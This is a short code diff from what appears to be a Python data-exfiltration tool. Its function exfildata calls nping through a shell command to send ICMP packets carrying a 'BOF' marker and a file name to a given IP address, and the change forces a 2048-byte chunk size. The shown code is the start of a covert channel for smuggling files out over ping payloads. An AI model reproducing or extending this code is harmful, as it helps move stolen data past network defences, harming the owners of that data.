@@ -42,8 +42,8 @@ def readfile(filename):
 def exfildata(ipaddress, file, compress, npinglocation, chunksize):
     status = True
     error = ''
-    if chunksize == 0:
-        chunksize = 2048
+    
+    chunksize = 2048
     x = 0
     subprocess.call(npinglocation + ' ' + ipaddress + ' --icmp -H --quiet -c 1 --data-string "BOF' + str(file) + '"',
                     stdout=None)
